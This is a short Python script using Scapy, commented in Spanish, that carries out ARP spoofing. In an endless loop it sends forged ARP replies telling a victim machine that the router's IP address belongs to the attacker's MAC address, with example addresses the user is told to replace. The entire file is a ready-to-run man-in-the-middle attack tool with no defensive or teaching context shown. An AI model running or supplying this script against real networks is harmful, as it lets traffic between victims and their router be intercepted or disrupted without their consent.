from scapy.all import ARP, send
import time

def arp_spoof(target_ip, spoof_ip, attacker_mac, interval=2):
    # Crea un paquete ARP para decirle a la máquina víctima que la IP del router tiene la MAC del atacante
    arp_response = ARP(pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=spoof_ip, hwsrc=attacker_mac, op=2)
    
    try:
        print(f"Iniciando ARP spoofing hacia {target_ip}, haciéndose pasar por {spoof_ip}")
        while True:
            send(arp_response, verbose=False)
            print(f"Enviado paquete ARP a {target_ip} [suplantando {spoof_ip}]")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("ARP spoofing detenido.")

if __name__ == "__main__":
    target_ip = "192.168.0.24"  # Reemplaza con la IP de la víctima
    spoof_ip = "192.168.0.1"    # Reemplaza con la IP del router
    attacker_mac = "28:CD:C4:F2:7E:94" # Reemplaza con tu dirección MAC real
    interval = 2  # Intervalo en segundos entre envíos de paquetes
    arp_spoof(target_ip, spoof_ip, attacker_mac, interval)
